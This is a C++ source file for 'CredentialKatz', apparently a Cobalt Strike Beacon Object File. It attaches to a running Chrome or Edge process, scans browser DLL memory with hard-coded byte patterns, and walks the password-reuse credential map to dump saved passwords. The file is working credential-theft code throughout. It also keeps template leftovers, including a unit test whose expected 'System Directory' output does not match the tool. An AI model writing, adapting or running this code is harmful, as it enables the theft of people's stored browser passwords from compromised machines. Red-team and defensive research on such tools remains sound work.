#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */

#include "CredentialKatz/Process.cpp"
#include "CredentialKatz/Memory.cpp"

#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {

    DFR(MSVCRT, _stricmp);
#define _stricmp MSVCRT$_stricmp

    //This is important!
    void banner() {
        formatp buffer;
        int bufsize = 512;
        BeaconFormatAlloc(&buffer, bufsize);
        BeaconFormatPrintf(&buffer, "  _____              _            _   _       _ _  __     _       \n");
        BeaconFormatPrintf(&buffer, " / ____|            | |          | | (_)     | | |/ /    | |      \n");
        BeaconFormatPrintf(&buffer, "| |     _ __ ___  __| | ___ _ __ | |_ _  __ _| | ' / __ _| |_ ____\n");
        BeaconFormatPrintf(&buffer, "| |    | '__/ _ \\/ _` |/ _ \\ '_ \\| __| |/ _` | |  < / _` | __|_  /\n");
        BeaconFormatPrintf(&buffer, "| |____| | |  __/ (_| |  __/ | | | |_| | (_| | | . \\ (_| | |_ / / \n");
        BeaconFormatPrintf(&buffer, " \\_____|_|  \\___|\\__,_|\\___|_| |_|\\__|_|\\__,_|_|_|\\_\\__,_|\\__/___|\n");
        BeaconFormatPrintf(&buffer, "By Meckazin                                  github.com / Meckazin \n");
        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, &bufsize), bufsize);
        BeaconFormatFree(&buffer);
    };

    void ConvertToByteArray(uintptr_t value, BYTE* byteArray, size_t size) {
        for (size_t i = 0; i < size; ++i) {
            byteArray[i] = static_cast<BYTE>(value & 0xFF);
            value >>= 8;
        }
    }

    //Example inputs:
    //  edge:   0a000000060000002f6564676500
    //  chrome: 0c000000080000002f6368726f6d6500
    //  edge and PID: 0e000000060000002f6564676500f41e0000
    // Remember, first flag then PID!
    /* Beacon > addString /edge
       Beacon > addint 7924
       Beacon > generate
       0e000000060000002f6564676500f41e0000
    */
    void go(char* args, int len) {
        banner();
        BeaconPrintf(CALLBACK_OUTPUT, "Don't use your cat's name as a password!\n\n");

#ifndef _WIN64
        BeaconPrintf(CALLBACK_OUTPUT, "32bit version is not currently supported.\n");
        return;
#endif // !_WIN64

        DWORD chromePid = 0;
        LPCSTR targetConfig = NULL;
        datap parser;
        BeaconDataParse(&parser, args, len);
        if (parser.original == 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "Missing mandatory argument /chrome or /edge\n");
            return;
        }
        targetConfig = BeaconDataExtract(&parser, NULL);
        chromePid = (DWORD)BeaconDataInt(&parser);

        BYTE chromePattern[] = {
            0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA,
            0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48,
            0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
            0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0x48, 0xBB, 0x00,
            0x00, 0x00, 0x00, 0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0xAA, 0xD0, 0x48, 0x21, 0xD8, 0x48, 0x3B, 0x05,
            0xE4, 0x15, 0x2E, 0x0B, 0x75, 0x08, 0x48, 0x89, 0xAA, 0xE8, 0x12, 0x41, 0xA3, 0xFD, 0x48, 0x8B,
            0x4E, 0x18, 0x48, 0x21, 0xCB, 0x48, 0x3B, 0x1D, 0xCC, 0x15, 0x2E, 0x0B, 0x74, 0x20, 0x48, 0x89,
            0x7E, 0x18, 0xB9, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x03, 0x4E, 0x10, 0x48, 0x83, 0xC6, 0x08, 0x48,
            0x89, 0xF2, 0x48, 0x83, 0xAA, 0x20, 0x5B, 0x5F, 0x5E, 0xE9, 0x62, 0x10, 0x4D, 0xFE, 0xE8, 0x4D
        };

        BYTE edgePattern[] = {
            0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA,
            0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48,
            0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0x8A, 0x41,
            0x48, 0x3A, 0x42, 0x48, 0x75, 0x11, 0x84, 0xC0, 0x74, 0x22, 0x48, 0x89, 0xF1, 0x48, 0x83, 0xC4,
            0x20, 0x5E, 0xE9, 0xAA, 0xAA, 0xAA, 0xAA, 0x84, 0xC0, 0x75, 0x17, 0x48, 0x85, 0xF6, 0x74, 0x20,
            0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0xC6, 0x46, 0x48, 0x01, 0x48, 0x83, 0xC4, 0x20,
            0x5E, 0xC3, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0xC6, 0x46, 0x48, 0x00, 0xEB, 0xEC,
            0x0F, 0x0B, 0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x38, 0x4D,
            0x89, 0xCE, 0x4C, 0x89, 0xC7, 0x48, 0x89, 0xD3, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0xAA, 0xAA
        };

        LPCWSTR processName;
        LPCWSTR dllName;
        PBYTE pattern;
        size_t szActualPattern = 0; //This is for pattern matching
        bool isChrome = true;

        //If chrome
        if (_stricmp(targetConfig, "/chrome") == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting Chrome\n");
            processName = L"chrome.exe";
            dllName = L"chrome.dll";
            pattern = chromePattern;
            szActualPattern = sizeof(chromePattern);
        }  //If edge
        else if (_stricmp(targetConfig, "/edge") == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting Edge\n");
            processName = L"msedge.exe";
            dllName = L"msedge.dll";
            pattern = edgePattern;
            szActualPattern = sizeof(edgePattern);
            isChrome = false;
        }
        else if (_stricmp(targetConfig, "/webview") == 0) {
            //BeaconPrintf(CALLBACK_OUTPUT, "Targeting Msedgewebview2\n");
            //processName = L"msedgewebview2.exe";
            //dllName = L"msedge.dll";
            //pattern = webviewPattern;
            //szActualPattern = sizeof(webviewPattern);
            //isChrome = false;

            BeaconPrintf(CALLBACK_ERROR, "msedgewebview2 is not currently supported!\n");
            return;
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "No target type specified! Use /edge or /chrome to specify target!\n");
            return;
        }

        HANDLE hChrome;
        if (chromePid != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Using the supplied PID: %d\n", chromePid);
            if (!GetChromeHandle(chromePid, &hChrome)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to get handle\n");
                return;
            }
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "No PID specified, searching for browser process\n");
            if (!FindCorrectProcessPID(processName, &chromePid, &hChrome)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to find suitable browser process\n");
                return;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "Targeting PID: %d\n", chromePid);
        }

        uintptr_t baseAddress = 0;
        DWORD moduleSize = 0;
        if (!GetRemoteModuleBaseAddress(hChrome, dllName, baseAddress, &moduleSize)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find %ls base address!\n", dllName);
            CloseHandle(hChrome);
            return;
        }

#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Found the %ls base address on 0x%p\n", dllName, (void*)baseAddress);
#endif
        uintptr_t resultAddress = 0;
        if (!FindDllPattern(hChrome, pattern, szActualPattern, baseAddress, moduleSize, resultAddress)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find the first pattern\n");
            CloseHandle(hChrome);
            return;
        }

#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Found first pattern on 0x%p\n", (void*)resultAddress);
#endif
        BYTE secondPattern[sizeof(uintptr_t)];
        ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));

        if (!FindDllPattern(hChrome, secondPattern, sizeof(uintptr_t), baseAddress, moduleSize, resultAddress)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find the first target pattern!\n");
            CloseHandle(hChrome);
            return;
        }
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Found second pattern on 0x%p\n", (void*)resultAddress);
#endif
        BYTE thirdPattern[sizeof(uintptr_t)];
        ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));

        uintptr_t* PasswordReuseDetectorInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 100); //There is no person with computer RAM enough to run more than 100 chrome instances :D
        size_t szPasswordReuseDetectorInstances = 0;
        if (PasswordReuseDetectorInstances == NULL || !FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), PasswordReuseDetectorInstances, szPasswordReuseDetectorInstances)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find the third pattern!\n");
            CloseHandle(hChrome);
            free(PasswordReuseDetectorInstances);
            return;
        }

#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Found %Iu instances of CookieMonster!\n", szPasswordReuseDetectorInstances);

        for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
            BeaconPrintf(CALLBACK_OUTPUT, "Found CookieMonster on 0x%p\n", (void*)PasswordReuseDetectorInstances[i]);
#endif
        //There should really be one instance, but might be more if more windows are created?
        for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
        {
            if (szPasswordReuseDetectorInstances == NULL || PasswordReuseDetectorInstances[i] == NULL)
                break;

            uintptr_t CredentialMapOffset = 0; //Offset to passwords_with_matching_reused_credentials_ 0x20 for my own debug build
            CredentialMapOffset += PasswordReuseDetectorInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
#ifdef _DEBUG
            BeaconPrintf(CALLBACK_OUTPUT, "[*] CredentialMap should be found in address 0x%p\n", (void*)CredentialMapOffset);
#endif
            WalkCredentialMap(hChrome, CredentialMapOffset);
        }

        CloseHandle(hChrome);
        free(PasswordReuseDetectorInstances);

        BeaconPrintf(CALLBACK_OUTPUT, "Done\n");
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    bof::runMocked<const char*, int>(go, "/chrome", 0);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif